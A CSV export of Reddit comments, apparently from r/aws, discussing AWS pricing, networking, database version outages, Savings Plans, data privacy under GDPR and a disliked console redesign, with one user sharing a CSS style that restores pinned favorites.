If selling goods is your goal, go use Shopify/Wordpress/etc...",3.0
g5ohy2r,iuucnp,"Seems like people are just offering nothing but offenses. Not sure what makes me sound like I don't know what I am doing from a few sentences.

Another system is in place that cost money to develop and switching things over to shopify is not an option.  Wordpress is already being used but are wanting to keep that separate. 

Was it really that offensive to ask a question to get some ideas? I guess what is point of reddit? Seems more negative then constructive this month.

Anyways I may have found a possible option. Just to bad there was no room for discussion to create content that might have helped others.",-2.0
g5oi2ly,iuucnp,"Congrats on your possible option, best of luck.",1.0
g5oi7rl,iuucnp,Thanks and dang like people are just watching to downvote any comments. You got like 2 negatives already man just brutal 🤣,0.0
g5oqiuk,iuucnp,Use signed URLs with CloudFront to restrict your downloads.,1.0
g5o1pje,iut8i2,"I'm not familiar with how EB works with Ruby, but it seems bad to not version lock a critical dependency like Puma. If that's under your control, I would look into doing so.",2.0
g5o4vfg,iut8i2,"Second this, /u/Grease10 it really sounds like you are not pinning critical libraries so when you went to try and roll back to a previous version, it sounds like you built the previous versions code with the new broken lib.

In my experience, pinning libraries and releasing upgrades to those (AFTER you have groked the release notes) separately than code releases is the best move",1.0
g5pfk8d,iut8i2,"The platform in beanstalk lists a specific puma version.  A problem they had for a while was using a really old version.  With the AL2 platforms they have upgraded to newer versions but the AL platform is still listed as the older one.  At some point they must have changed it for AL as it was running the latest 4.x.x version as well earlier yesterday.

I don't know of a way to control the version without some sort of hack script to replace it after the fact.  That doesn't mean there isn't one but I have had no reason to find one before.

The big issue for anyone using at least the AL version of the ruby/puma platform (and possibly the AL2 version as well) is that the platform was broken.  If you rely on ruby with puma from beanstalk and run the default configuration it is simply broken currently and puma will never start until Amazon removes that deprecated line in the pumaconf.  

I primarily wanted to post this here in case anyone else runs into the issue and comes here looking for anything on it.",1.0
g5n2ro7,iusmks,"What a bad week for AWS, huh",10.0
g5mvbe2,iusmks,Yes.. i have the same problem,2.0
g5my3ko,iusmks,parece que voltou,2.0
g5n0rps,iusmks,"Sim, estamos estáveis também agora, o que mais incomodou foi o fato de que um RDS PostgreSQL com Multi-AZ no sae1-az1 ficou inacessível e não executou qualquer tipo de failover.",2.0
g5st8lj,iurihj,Really cool! Thanks for Sharing :),1.0
g5omikr,ius2m6,"Figure out who your account manager is and contact that person, they should be able to help.",0.0
g5n9dt3,ius2m6,"Always have access keys configured on your computer with 

   aws configure 

Then you can just use 

   aws iam update-login-profile 

To change the password.",-3.0
g5mlu9o,iuqw4q,[deleted],0.0
g5p2zlc,iuqw4q,"Hmm this will be a new experience for me. Excited to try. As for looking up resources, I suppose lookup creating a print server and find out how to make ques with GPOs?",1.0
g5pldsi,iuqw4q,"Yup.  Maybe post to /r/sysadmin, this is basically generic stuff.",1.0
g5mmfg6,iuramb,"Use lambda or EC2 to auth users and generate signed s3 url, redirect users to cloud front or cdn of your choice with signed url.

Use cognito or okta or auth0 to federate user from other social platform.

Running cost would be not bad, serving data cost will bankrupt you.",12.0
g5w05te,iuramb,Would it? The media files may be able to be offloaded to CloudFront and that’s pretty cheap,1.0
g5mmgnz,iuramb,"More money than you'd make from it.

Let alone handling licensing for music anyone would listen to... Record labels just don't deal with smaller players...

maybe look at the architecture of similar services:

https://developers.soundcloud.com/blog/evolution-of-soundclouds-architecture

https://engineering.atspotify.com/",11.0
g5mxx87,iuramb,Well its my own music so that helps. :),6.0
g5ou9yj,iuramb,I’m curious then why you wouldn’t just use SoundCloud? Spend your time on your craft instead of reinventing wheels on cloud platforms unless there’s some really good reason to go this route that I’m missing... your time perfecting this would be significant and your time is valuable :),3.0
g5muwfz,iuramb,I would put the backend in AWS but I would not stream anything out of AWS . AWS bandwidth costs are fairly high and should put the media serving servers in other ISP's that have much cheaper bandwidth costs.,3.0
g5my4jz,iuramb,Oh really? I had a feeling that the bandwidth part (the actual music streaming) would be the thing that gets me.,2.0
g5n6rw1,iuramb,"Yes, the bandwidth is the cost that will get you in AWS.  
You put the backend servers in AWS and then you have some physical servers in other non-AWS ISP's that take orders from your AWS servers. When someone wants to login, manage their account or decide what to listen to, that is all sent to the AWS servers. Then the AWS servers send the customers over to the non-AWS servers to get the streams of the music. 

There are some ISP's out there that have bandwidth costs that are a 1/10th of what AWS charges.",1.0
g5niqzr,iuramb,"This is more or less what Netflix does, I believe. Backend and frontend is hosted on AWS but the actual content streaming comes from their own CDN.",1.0
g5q6d52,iuramb,True... Maybe I can make the users cache media locally on their device and make them reauthenticate once in a blue moon. Then it won't be constant data flowing back and forth.,1.0
g5n8k73,iuramb,"Lots of factors.  Let's go with a bitrate of 160kbps.  You should think about what it will cost per user, and think about what kind of usage each user will generate.

Worst case scenario, you have 100k users streaming 24/7.  That's 1.2 GB/sec or about 4.5 PB of data transfer / month.  Thats about $255,000 / mo, or $2.55 / user.

But if they're only listening for 1 hour per day, then it's around 203 TB of data and $14,300 / mo or $0.14/user.

You could also cache the media locally for a period of time like Spotify does.  In your case it sounds like a (relatively) small catalogue, so locally cached copies could get this price way down.

So it's expensive if it's a free service you are providing, but at $0.14/user for a paid service, it's something you could easily do at a profit.

And by the way, nobody that is pushing out that kind of data pays public pricing.  On the CloudFront pricing page, it says to contact for discounted pricing if you're sending over 10TB/mo.",3.0
g5q68q1,iuramb,Almost seems to make sense to make the users cache the media locally on their device. I bet it will cause it to drop to a fraction of that....,1.0
g5mmf8t,iuramb,"Just to be clear, but you don't have to deal with live music, just prerecorded?",2.0
g5mxurr,iuramb,"Correct. Wav files and its my own content. But Im not interested in using Spotify. While its easy to do spotify, I know there are some pluses to managing your own music on your own service. But only if its cost effective.",1.0
g5nqerg,iuramb,"As others have suggested, the egress bandwidth costs will get pretty expensive. 

A similar (maybe?) project (https://github.com/tbergman/relisten-web) is hosted primarily on webhost4life (https://www.webhost4life.com/legal/legal-unlimited.html?type=details). They offer unlimited disk and bandwidth for very reasonable prices. Put a CDN in front of it for edge speed and durability.",1.0
g5q6ist,iuramb,"I'll check that out also, I was floating the idea of making users cache media locally and maybe make them reauth once in a while, that would probably cut costs dramatically. But the media would need to be lightweight or it will blow up storage on their device.",1.0
g5olshy,iuramb,"How about hosting the website on aws and the backend and use WebTorrent to share the music ? 
https://webtorrent.io/",1.0
g5q6r62,iuramb,I'm not familiar with Webtorrent as a way for delivery.,1.0
g5nfacn,iuramb,"First, do your MVP in Google Cloud. 

Then, if you absolutely need to AND can afford it, move your platform to AWS. 

Otherwise, you're going to lose all your money in streaming fees before you can even turn a profit.",-3.0
g5ni3bc,iuramb,[deleted],0.0
g5ni899,iuramb,I'd like to see those numbers.,1.0
g5m9et0,iuomsp,Just ditch RIs and start using Savings Plans.   Way better.,6.0
g5mcftm,iuomsp,this one,3.0
g5mdchj,iuomsp,In this case yes.  But there are many reasons why RIs can still be better.,1.0
g5mmf8c,iuomsp,Is this always true?  I know for my use case I'm always going to have two redundant app servers of the same size in which case I can just purchase two reserved instances with 3 year reservations and be done with it.,1.0
g5mo7ba,iuomsp,"If you use the EC2 Instance Savings Plan it ends up being exactly the same price with less administrative overhead -- an m5.large in us-east-1 on a 3-year term is exactly the same price with a single SP as it is with 2 RIs.

If you use the more flexible Compute Savings Plan, it ends up being exactly the same price as convertible RIs, but again with much less overhead.

There is basically no good reason to use RIs now unless your organization is so utterly tied to them that all of your automation would break or your accounting department would catch fire.",3.0
g5n637f,iuomsp,Sweet thanks for the info!,2.0
g5mgoqz,iuomsp,"Thanks, I will definitely look into saving plans.

But if I pick the different C5 instance, c5.large instead of c5.xlarge, it will replace the retired one without having to do anything else? Because last year I just picked the exact same c5 instance and it just replaced the old one that I could then shut down and remove.",0.0
g5mmdbj,iuomsp,"EC2 Reservations are not ""instances"". When you say ""the retired C5 instance will be replaced without me having to create images of the old C5 instance or anything right"" it doesn't make sense.

An EC2 Instance cannot ""retire"".

What retires is the thing called a reservation, which is a ""floating"" billing thing and can \*apply\* to at most one instance matching its class/az/platform\*. If you terminate an instance that was covered by a reservation, the reservation will ""float"" to the next instance that it can match that is not already ""covered"" by a reservation.

Over its lifetime, a reservation can apply to a large number of instances.

\*Also be aware of the ""instance size flexibility"" aspect where, for example, two large reservations can cover an xlarge instance.",5.0
g5mlza0,iuomsp,"stop instance, change type, start instance. job done.

edit: unless it's in an ASG, then you can change the launch config type and terminate the current instance. you'll get a new one with the correct type.",1.0
g5m8ujc,iupj8z,"Yup.
So ensure you have a route in your route table, a security group allowing you out, NACLs allowing the traffic both way and lastly DNS works! 
So a few things :)",5.0
g5ojrl8,iupj8z,Make sure that you have an internet gateway attached to your VPC and your NAT gateway is in a public subnet.,1.0
g5mkc2n,iuojz9,AWS is having a rough week...,27.0
g5nyqp4,iuojz9,"Yeah, it was a wake-up call for me for sure. I've never had an outage noticeably affect my work but that IAM outage the other day had me chasing my tail for almost an hour before I decided to check the status page.

&amp;#x200B;

I'm so used to AWS having insane reliability that it never even dawns on me that it could just break like that.",16.0
g5onr6j,iuojz9,"Not sure if its just me but I feel like their first line support has degraded a bit too. 

Like in the past you would 100% get someone who was an expert with the correct answers on your first interaction with support. 

The past two tickets ive had to deal with the support person seemed to not be at that standard and kept talking about possibly escalating.  


Lightyears ahead of azure still but it was a shock because i'm used to such a high standard of service from AWS.",5.0
g5orwhb,iuojz9,"I did notice that it has changed for the worse, but I don't blame them.

I work for a wall street bigcorp and their offshore folks constantly open tickets with AWS support asking to solve their most basic Linux/computer issues. 

I can't imagine having a highly paid expert on anything answering these sorts of tickets. So you get to go through a gatekeeper, until you hopefully get placed in the right queue. 

That being said, we had some issues with EKS, and it did take several days for the gatekeeper to get a response from the backend team.",3.0
g5os2vj,iuojz9,"Yeah ive noticed that too, We had some ""imported"" people who were sending them tickets like ""how do I patch this windows server"", not in ssm by the way  just windows admin advice. 

I was kindof shocked that AWS actually responded to those tickets.",2.0
g5qhqx3,iuojz9,"It really depends on the service I feel. Something with massive usage (EC2, S3, RDS, etc) seems like there’s ticket/queue jockeys now vs something like the weird issue I had with Control Tower the other week.

Went in on that one expecting another ticket jockey experience, was very surprised I got someone who saw the same weird issues I was seeing and was wanting to get to the bottom of it.",1.0
g5nlu3o,iuojz9,Tell me about it 😞,2.0
g5nddfk,iuojz9,Whoa so NOT EXISTS was acting like EXISTS?  That would suck on so many levels,12.0
g5ng6wj,iuojz9,Ha. Was terraforming Aurora Postgres earlier this week. Kept getting the error 🤷‍♂️ thought it was on my end and I was going crazy. Eventually found a version that worked...,6.0
g5mdixs,iuojz9,Big oof from me dog,15.0
g5n7mol,iuojz9,"slightly unrelated, but I'm also unable to deploy serverless postgresql, there's no option in the UI, was only able to do it from CloudFormation, and only a single version is available (I think it was 10.7).

If you enable option to have it sleep on inactivity, it requires exactly 30s to startup, while the API Gateway has hardcoded timeout at 29s. 

It's like AWS does everything to make users avoid using postgresql and replace it with DynamoDB.",11.0
g5osrbz,iuojz9,"&gt;  I'm also unable to deploy serverless postgresql, there's no option in the UI,

Latest versions of postgres don't have serverless options. You gotta go back through the list a few versions to find one that does.

Had the same problem few weeks ago. Didn't find any documentation on which versions had serverless, just stumbled on it.",1.0
g5psth6,iuojz9,"Yeah it's very confusing, and I was also trying different versions until it worked, but I eventually figured out that I can use aws-cli command to query it.",1.0
g5m6rtc,iuojz9,Yikes,7.0
g5mnmao,iuojz9,That’s gonna be a yikes from me dawg,2.0
g5mf94b,iuojz9,"Ouch... 

\+1 for an exhaustive DR procedure and external dumps, and even with that some dudes must have had a terrible time",5.0
g5mg9dq,iuojz9,"Would most dr handle that version just disappearing though? 

Is imagine a lot of people have dumps, archives, backups, full infrastructure as code and multi AZ resilience, but if you are tied to a specific version of the DB (and the cloud) without access to it I'm not sure you could restore it easily at all..",9.0
g5mh1go,iuojz9,"I may not have understood correctly but I thought if your RDS instance was to have to restart for whatever reason while the version isn't available it just wouldn't.

And your snapshots wouldn't be usable either",4.0
g5mk6ul,iuojz9,"FTA:And if you wanted to perform an operation, such as restoring a snapshot, using one of the vanished builds, you'd run into an error long the lines of' cannot find version 10.13 for aurora-postgresql'.

Yikes!!  That's scary.",2.0
g5n1cry,iuojz9,"Typically, yes, but if you have a variable demand with say load balancing access regions, or spot/reserved hedging then it might be quite common for you to spin up and down instances.

In this case you could even be using Aurora serverless, in which case you have no sight of or control over when instances come up or down at all, just overall guarantees on the actual service itself.

I could imagine a hypervisor identifying a capacity problem in Asia (unable to spin up new instances) and so deciding to move to a cluster in Europe as fail over, then Europe starts to have capacity issues (it too can't start up the exact DB instances it needs) so starts to have issues and you have a cascade failure on your hands, without ever intentionally trying to restart any of your instances.",-1.0
g5m28mh,iunyj5,"You'll need to use Api Gateway. The lambda will be invoked from the Api  Gateway event.

If you're after a scripted approach, I recommend  you look into serverless framework. There should be plenty examples out there where you can easily deploy a stack with a lambda triggered via Api  Gateway",3.0
g5mt3fb,iunyj5,"&gt;I will only truly understand the mechanics when I can see the method calls laid out. Thank you, but I am not asking for the 'best' approach, I just want to know the API Gateway method calls necessary to perform this task. This is how I learn, bottom up.",1.0
g5m1xuq,iunyj5,"You will need API Gateway for the POST requests, this kind of situation is exactly what API Gateway is meant for.

Why are you using bash scripts and not IaC like Cloudformation or Terraform?

I know you don't want to use the console (and you're not wrong), but sometimes I find playing around in the console the best way to figure things out, and then once I understand what I need to do I translate it to IaC.",2.0
g5m3g6h,iunyj5,u/ElectricSpice thanks for replying. Could you suggest the calls to make to API Gateway?,1.0
g5m90j9,iunyj5,"Seriously just use Cloudformation. https://blog.jayway.com/2016/08/17/introduction-to-cloudformation-for-api-gateway/

Right now you’re reimplementing Cloudformation in bash, and that’s only going to cause you pain.",2.0
g5pdk7r,iunyj5,"Using an HTTP Api Gateway (cheaper and easy to link to Lambda) + Serverless you can set this up in about 10 lines of code. Please dont use bash scripting for this, you’re making it way too complicated.",1.0
g5lw1h0,iunjnz,"It’s due to the CAA policy of Amazonaws.com, you’ll need use a domain without that policy. If you don’t have funds for a domain of your own you can get a free one at afraid.org which wouldn’t be encumbered with that policy",1.0
g5lwm56,iunjnz,"I don't know anything about BigBlueButton or TURN (or even that they are) but the issue you're describing now is that you can't get a certificate for the EC2 public hostnames because it would be a security concern. You'd be able to get the cert and then terminate the instance, at which point the IP address (and thus the hostname) get re-used for someone else's EC2 instance, and suddenly you have a valid cert for a machine that isn't yours.

As you guessed, you need to set up a different public hostname for it (i.e. a domain name). You don't need to use Route 53 though, as long as you own a domain name and can control the DNS records for it, you're golden. You can assign an Elastic IP to the instance (which is free of charge as long as it is actually assigned to a running EC2 instance), and then set up an A record for that IP address on your own domain, or a CNAME for the EC2 public hostname.

(Technically the Elastic IP isn't even required but you'd have to update your DNS every time you stop and start the instance.)",1.0
g5ly9qy,iuna6n,You'll may want to create a service account that doesn't have console login and has access to only the specific service you need (like S3).  They you can create a key for that service and attach that key to the Veeam software.  The software will have any rights linked to the service user.,1.0
g5m6gji,iuna6n,"Hey,

Is there a guide on how to do this? The one on AWS seems to be unrelated.

&amp;#x200B;

Edit: nevermind was able to figure it out!",1.0
g5lk3dh,iul5h3,Preview means contact support to add feature flag on your account.  Then they work like anything non preview,3.0
g5ncu9c,iul5h3,Thanks!,1.0
g5l76sq,iukld0,"There are quite a few pay-per-job / contractor web services out there.  I have not been impressed with IQ (as a consultant).  Lots of unfiltered support requests, open questions, etc. vs. actual work engagements.",2.0
g5lzr5v,iukld0,That’s a real shame. The idea has great potential. Hopefully they improve and expand it,2.0
g5lam8a,iukfky,"Surprisingly looks like it's free.  


\&gt; There are no additional charges for rules or event delivery. There are no minimum fees or upfront commitments. All state change events published by AWS services are free.",3.0
g5mbo0t,iuj0ww,You have an incorrectly formatted yaml - the *ReplicationConfiguration* block must be two spaces to the left.,3.0
g5md12e,iuj0ww,"Just went to check that there and it's in the correct position (same line as *VersioningConfiguration*) I think that must've been a mistake when i copied the code into reddit, thanks for pointing that out! Just updated the post now.",2.0
g5l7ui9,iuiuza,"ECS Fargate is pretty low overhead, thought it can run outside vpc.",6.0
g5lfoma,iuiuza,"fargate takes time to serve when offline?

&amp;#x200B;

I assume its serverless kinda cold start?

And are you sure it can run outside vpc?",1.0
g5m5i0c,iuiuza,Nope it’s always running. And you can select 512mb of RAM and 0.5vCPU so it works out pretty cheap.,3.0
g5mot9z,iuiuza,You can run on spot (depending on your availability requirements) or use Savings Plans for further discounts as well.,3.0
g5li21y,iuiuza,If you deploy an ECS container in a private subnet with no method of egress (NAT Gateway or NAT Instance) then you won’t reach the internet just like any other compute resource. If this is just a simple test you can target a public subnet. That’s just not best practice for production/secured deployments.,3.0
g5mxk6g,iuiuza,"lamda is the simplest compute resource, but depending on what your running on your container, it might take more work to re-architect the solution.",1.0
g5mypvx,iuiuza,I am using postgres so the lambda without RDSProxy is expensive in response time.,1.0
g5r9wi3,iuiuza,ECS deployment in public subnet using spot EC2. RDS in private subnet,1.0
g5lhofr,iuiuza,If you dont mind the $70/mo controlplane overhead you can do EKS with Fargate profiles too,-2.0
g5litr1,iuiuza,"if the nat gateway is expensive, the eks control plane is probably not an option",5.0
g5lp9xc,iuiuza,"We are already using EKS for another project. 

I don't want to abuse my rights by running personal project on their k8s.

And yeah, controlplan and nat gateway is out of option since its a pretty small idea prototype.",1.0
g5lylvf,iuiuza,"Then why not just run a simple EC2 instance in a public subnet and install Docker? Or even cheaper, install Docker on a Lightsail instance ($5/mo).",5.0
g5m50j1,iuiuza,"That is an option, indeed. Thanks

I was hoping to find something that is more aws managed :)

Lambda is an option but it seems even with rds publicly accessible, the latency is above 2.8 seconds on average without any data.",1.0
g5mijr8,iuiuza,"If it's personal project, consider using a personal account.

The free tier includes 720 core hours/month (30d x 24hrs).  You can slice that however makes sense",1.0
g5krgjq,iuf9uu,"Obligatory I-Am-Not-A-Lawyer, but you're probably not storing data outside the EU. As long as you use AWS regions within the European Economic Area there's no cross-border information flow to outside the EEA. And unless your company itself is established outside the EU, you're contracting with a Luxemburg company (AWS EMEA SARL): [https://aws.amazon.com/legal/aws-emea-countries/](https://aws.amazon.com/legal/aws-emea-countries/)",7.0
g5ld83o,iuf9uu,"The Argument goes as follows: (Obligatory I-Am-Not-A-Lawyer)  


1. AWS/Amazon is a US Company and able to access all infrastructure and Data from the US
2. By US law, US companies must give all the 3 letter agencies access to the data available, even if that data is stored outside of USA. (e.g. in Frankfurt) 
3. Thus: There is no way to avoid US access by 3rd Parties to data and following there is a legal problem. 

basically all this was revealed by Snowden as far as I know.   


I am just repeating what i heard or saw discussed. Not that I want it to be like this",5.0
g5qj1mt,iuf9uu,"There's two ways to look at this:

First, the legal view. That's simply ""Well, we're contracting with an EU company that says your data stays in the EU, nothing to see here"" and possibly even pointing to [https://aws.amazon.com/blogs/security/customer-update-aws-and-the-eu-us-privacy-shield/](https://aws.amazon.com/blogs/security/customer-update-aws-and-the-eu-us-privacy-shield/) if you want to transfer data to an AWS datacenter outside the EU. In the legal world those 3-letter-agencies are irrelevant, since you're doing business with AWS Europe and European law says they cannot send data to those agencies (well, I presume it says that anyway). So in that worldview you're all good. 

Then there's the second view, the harsh reality: those 3-letter agencies *will try to* get their hands on your data if they really want to, but they won't simply ask AWS because they will fight any such request tooth-and-nail. Once word of such requests gets around there will suddenly be a huge opportunity for non-US cloud providers, and neither AWS nor the US government want that. So in practice they didn't ask: [This news](https://www.theverge.com/2013/10/30/5046958/nsa-secretly-taps-into-google-yahoo-networks-to-collect-information) was a real wake-up call for the big cloud players. Apparently it was easier for the NSA to just tap into the data without asking. 

The good news is that this got a lot harder. As a result of that news Google started encrypting all traffic between their datacenters, and so did AWS. And not just that: Google now has custom-built hardware modules in each server that can verify the hardware is  authentic and to authenticate internal API calls. AWS developed the Nitro hardware and a custom HSM to store encryption keys. And there's tons of other similar initiatives that were developed not at the request of customers, but because AWS, Google and Microsoft all want to prevent that from ever happening again. So in practice I'd trust my data to be pretty safe in any of the major cloud services, and it's probably a lot safer than in a local, self-managed datacenter. One of the reasons these big companies build a lot of their own hardware is, after all, to prevent things like [the NSA intercepting router shipments to implant backdoors](https://gizmodo.com/the-nsa-actually-intercepted-packages-to-put-backdoors-1491169592). And [server shipments](https://www.infoworld.com/article/2609310/apple--cisco--dell-unhappy-over-alleged-nsa-back-doors-in-their-gear.html). And Chinese companies [rumoured to do the same](https://www.bloomberg.com/news/features/2018-10-04/the-big-hack-how-china-used-a-tiny-chip-to-infiltrate-america-s-top-companies).",1.0
g5kzgo8,iub770,"What is the program? Generally, this is caused by something like one of the dlls or executables being owned by another user. It could also be a temp file that was left behind when installing. Good hygiene when creating a base image is critical to avoid stuff like this (and some apps need extra help) in my exp.",2.0
g5vz1pa,iub770,"This isn't a Workspaces issue per se, but a Windows issue. Check your UAC settings. Also, is this program digitally signed? If it is, verify that the public certificate is installed so the signing certificate is recognized.",1.0
g5kp775,iugle3,"Why not just let A use a a lambda invoke function to B?  It is all in the aws ecosystem. Provided you have iam permissions in place, A can call B directly using InvokeFunction.",5.0
g5t2tpw,iugle3,"I ran into exactly the same problem as you. My solution was a little elaborate but it works...

So, the basic architecture is to create an event based system centred around DynamoDB. DynamoDB can be set up with a VPC endpoint. This comes at no cost unlike some of the other service endpoints

So the Dynamo table is for the events. Put events into the table then use DynamoDB streams to invoke a lambda function which takes the event and passes it to EventBridge (you could just as easily use SQS or SNS though)

The cost is basically nothing but not as easy to setup. However, if you are interested in this approach, I can provide sample code (I set it up as a CDK construct to make it easy)",1.0
g5klhoq,iugle3,"It would probably be easier to merge them into one lambda. It might not be ""proper"" microservices architecture, but it'll work",1.0
g5klu4w,iugle3,"I can't.

One requires internet access (communicating with 3rd party APIs) and that's provided for free by AWS and the other one technically requires communicating with RDS and the other Lambda only.  
I'd probs set a NAT Instance instead of a NAT Gateway",0.0
g5krhak,iugle3,If this is just a PoC you could make your RDS instance public (with decent password etc) and remove the VPC altogether if the data isn't sensitive,-1.0
g5kmgml,iugle3,SNS/SQS endpoint in the non-internet VPC.,1.0
g5kmj1l,iugle3,Do you care to explain? Sorry I'm just trying to understand,1.0
g5kqdm1,iugle3,"They are talking about vpc endpoints powered by private link. Basically it’s an internal endpoint to AWS services, rather than hitting the public internet. 

These are not free, and might cost you more than a NAT gateway/instance, so if price is ultimately your concern then the NAT instance might be cheapest for you.",1.0
g5l7n59,iugle3,"Usually messages between Lambdas or many services in AWS are via SNS/SQS.  These have been extended to private link which lets you create and endpoint for the service in your VPC (an ENI).  When you resolve the service endpoint like sns.us-west-2.amazonaws.com from within the VPC, instead of the public internet IP, you get the IP of the interface in your VPC.  Local connection. No internet access required.",1.0
g5lozx8,iugisk,What did you expect? GIF is uncompressed and if your source is already 7mb then the 80mb+ result doesn't suprise me.,1.0
g5pc3wa,iugisk,"Unrelated to the question, but Elastic transcoder is mostly replaced by MediaConvert, I wouldn't be creating anything new with it today. MediaConvert is cheaper as well.

As the other commenter said though; GIF isn't really well compressed, it has an image per frame and will *always* be larger than an equivalent mp4",1.0
g5kjaxt,iug6j1,"I almost exclusively use burstable instances. 

They aren't awkward and the prices are predictable. You just need to understand your baseline loads and how burstable credits work. If you are constantly running up bills on burstable instances you either need to upsize or you have a high baseline load that would actually justify a non-burstable class.",8.0
g5l0y3d,iug6j1,Same. I love me some t-series.,2.0
g5kjfte,iug6j1,"We spend more on T-family instances than any other family.

The only thing to know is that when your CPU utilisation level averages c.42% or more, you're better off going with an appropriately sized M- machine.

https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/burstable-performance-instances-unlimited-mode-concepts.html",4.0
g5kqlom,iug6j1,"The beauty of T-type instances is that you have a choice:

* Predictable pricing (default on t2, implemented by disabling the ""t3/t4 unlimited"" option for newer types); you can take full advantage of the smaller instance sizes and lower pricing but you'll need to monitor the available burst credits. If they run out performance will suffer. 
* Predictable performance, with a chance of higher prices (by enabling the unlimited option). Again, monitor your burst credits well, but if they run out it's your wallet instead of performance that suffers.

As a general rule of thumb, if your application is RAM-hungry use T-type instances and move to R instances if CPU usage is high enough to deplete your burst credits regularly. If it's CPU-bound choose C-type instances. And for everything in between there's M and other types.",5.0
g5lw4o2,iug6j1,"I have tons of them, probably the majority of the fleet. Unless you're sure you need consistent usage above the baseline for the instance type I would definitely recommend. We have found some cases where we needed to upgrade to m5/m5n to get better network or disk IO, but t3 covers the majority of cases for us.",1.0
g5kv5ty,iufnk5,It also broke aws role switcher plugins which people who use more than 5 accounts depend on to do their jobs (about 150 devs at our company).,18.0
g5l2so9,iufnk5,"Same here :(

  
But I saw that there is already an open issue in the repo, and there is one AWS employee from the Console t in the comments who is willing to help getting this back up and running :)",8.0
g5l2684,iufnk5,"😳 I've seen a few console changes coming down the pipe across several different accounts, but none have affected the main ui yet.. if the role switcher plugin breaks, that'll cause my whole team some fresh hell.",3.0
g5lirkx,iufnk5,"I hope this gets fixed soon. I manage dozens of accounts.  I appreciate the new look though, about time.",3.0
g5m93es,iufnk5,I don't like the menu either. Aside: Have you considered AWS SSO? My users find it easier to use the little portal app than to use the management console's role switcher.,1.0
g5l9r80,iufnk5,"Also when I type ""ECR"" into the services search, ECR is the 3rd thing on the drop down list.  
  
How does Secrets Manager and ECS come before it in the list?  
  
Typing ""Service Cat"" into the list gives Service Catalog as the 4th choice.   
  
It's the dumbest search function ever.  
   
Obviously when I searched ""Service Cat"", I was looking for ACM.",15.0
g5m8e8l,iufnk5,Hahaha. sECRets manager.,9.0
g5lmq3w,iufnk5,Looks like they're using the Windows 10 search algorithm :p,8.0
g5ojqqn,iufnk5,"This is nothing new unfortunately the service search, has always been kind of bad that way. I've just tested, I still have the old UI, and the search for ECR and Service cat does still come as the third option on the list :/",1.0
g5ojxec,iufnk5,"Yeah it's been like that for a couple months now.  
  
ECR used to be first on the list though. Dunno why it changed.",1.0
g5ksg7u,iufnk5,"I was just about to post about this. It's such a small thing but incredibly frustrating to not be able to pin services and not have to click twice to get to that service.

Edit: clarity",26.0
g5kt6dc,iufnk5,"You can still pin services, but they are inside of the menu.",1.0
g5kvabr,iufnk5,"Yeah cool but it turned one click into two, like many of the UI improvements it seems like almost everything now takes 2-3 times the clicks it used to.",11.0
g5lsajb,iufnk5,"&gt;Yeah cool but it turned one click into two, like many of the UI improvements it seems like almost everything now takes 2-3 times the clicks it used to.

Agree. Plain old bookmarks is the best solution (at least for myself).

However, new UI has made life difficult overall. Major turn-off is removing capability of viewing CW metrics for multiple TGs at once. It was very useful.",2.0
g5ncae8,iufnk5,"&gt; removing capability of viewing CW metrics for multiple TGs at once. 

When they enforce the new CW UI this will effectively kill our use of CW logs.",1.0
g5l6yrn,iufnk5,"I agree, sometimes I have the feeling that they try to force us to use the cli",1.0
g5kubro,iufnk5,Yeah good point. But is there a way to have them be pinned without having to click the dropdown?,4.0
g5l6zri,iufnk5,Not that I know,1.0
g5md2dc,iufnk5,Can I downvote the new console?,8.0
g5kpstv,iufnk5,"Just noticed it this morning too, very frustrating.  Can't quite understand the reasoning behind it...",6.0
g5ngwdu,iufnk5,"It's because companies don't expect UI ""designers"" to actually understand what their users are trying to do. They're too busy smelling their own farts and worrying about some abstract aesthetic that is divorced from real usability.",3.0
g5ldm3l,iufnk5,"I fixed this for myself with a user style, and I'm sharing it here for those as frustrated by this change as I was. I recommend the Stylus browser extension for applying user styles.

EDIT: Whoops, copied just the CSS and not the full user style. Here we go.

EDIT2: To clarify, this probably doesn't fix any issues the change causes with role switcher plugins and such, it is just a tweak that puts your favorites in the nav header when the services menu is closed, using some CSS tomfoolery.

EDIT3: A couple improvements, like separators, more explicit positioning, and overflow/overlap prevention. I'm not going to touch this again. Although I might stick it on greasyfork or something, in which case I'll edit here again to link that.

    @-moz-document domain(""console.aws.amazon.com"") {
    button[data-testid=""aws-services-list-button""]:not([aria-expanded]) + div {
        display: block;
        visibility: collapse;
    }
    
    button[data-testid=""aws-services-list-button""]:not([aria-expanded]) + div div[data-testid=""favorites-container""] {
        z-index: 9999;
        position: fixed;
        top: 0rem;
        left: 220px;
        padding-top: 0.25em;
        width: calc(100vw - 640px);
        height: 40px;
        overflow: hidden;
    }
    
    button[data-testid=""aws-services-list-button""]:not([aria-expanded]) + div div[data-testid=""favorites-container""] ol li {
        visibility: visible;
        display: inline-block;
        margin-right: 0.5em;
        margin-bottom: 1em;
    }
    
    button[data-testid=""aws-services-list-button""]:not([aria-expanded]) + div div[data-testid=""favorites-container""] ol li + li {
        border-left: 1px dotted #666666;
    }
    
    button[data-testid=""aws-services-list-button""]:not([aria-expanded]) + div div[data-testid=""favorites-container""] ol li button {
        display: none;
    }
    
    button[data-testid=""aws-services-list-button""]:not([aria-expanded]) + div div[data-testid=""favorites-container""] ol li a {
        padding-right: 0.5rem;
        font-weight: bold;
    }
    }",5.0
g5r2051,iufnk5,Absolutely terrible. Icon order is auto arranged alphabetically 😬,2.0
g5lkacg,iufnk5,"Of all the awful changes AWS has done in the console in various services .... I do find this change ... somewhat more polished. Specifically, the font sizes, responsiveness, dropdowns check height.  It is actually well done.

Does it take now 2 clicks instead of 1 ... yes; however, this is necessary for things like account details, federated logins/SSO / long emails to take longer precedence in the main account header row.

It's easier to distinguish getting support, account information (and #), well placed dividers.

Again, not a fan of the awful random changes in all other services and completely non-functional changes in things like R53, and EC2, etc. ... but I do like this change from a polish perspective. Think they did a good job.

If they were to keep one consistent team that is responsible for UI everywhere that has a very good attention to detail/functional testing ... I think they could start to make gradual improvements correctly instead of letting random teams do random things in each respective service.",3.0
g5llkci,iufnk5,"While most front-end UI/UX designers are getting rid of clicks and making navigation more intuitive, AWS adds one more click making it very frustrating to go back and forth between services. fail",1.0
g5lw1on,iufnk5,"Wait, what?  I don't see any changes to favorites or any new opt-ins...is this something being rolled out incrementally?",1.0
g5ly1rb,iufnk5,"That's my guess, as I don't see it yet either.",1.0
g5nh2gf,iufnk5,Only about half of the accounts I use have the change.,1.0
